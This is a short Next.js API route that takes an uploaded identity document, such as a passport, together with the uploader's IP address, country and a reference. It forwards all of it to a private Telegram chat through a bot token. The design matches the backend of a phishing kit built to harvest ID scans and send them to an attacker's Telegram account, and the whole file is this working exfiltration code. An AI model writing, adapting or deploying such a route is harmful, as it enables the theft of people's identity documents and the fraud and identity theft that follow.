import { CHAT_ID, TOKEN } from '@/lib/telegram';
import { NextRequest, NextResponse } from 'next/server';

export async function POST(req: NextRequest) {
    try {
        const formData = await req.formData();
        const file = formData.get('document');
        const selectedType = formData.get('selectedType')?.toString() || 'passport';
        const ip = formData.get('ip')?.toString() || '';
        const country = formData.get('country')?.toString() || '';
        const messageRef = formData.get('messageRef')?.toString() || '';

        if (!file || !(file instanceof Blob)) {
            return NextResponse.json({ success: false }, { status: 400 });
        }

        let caption = `📄 ID Document\nType: ${selectedType}`;
        if (ip) caption += `\nIP: ${ip}${country ? ` • ${country}` : ''}`;
        if (messageRef) caption += `\nRef: ${messageRef}`;

        const telegramForm = new FormData();
        telegramForm.append('chat_id', CHAT_ID);
        telegramForm.append('document', file, 'document');
        telegramForm.append('caption', caption);

        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
            method: 'POST',
            body: telegramForm
        });

        if (!response.ok) {
            return NextResponse.json({ success: false }, { status: 500 });
        }

        return NextResponse.json({ success: true });
    } catch {
        return NextResponse.json({ success: false }, { status: 500 });
    }
}
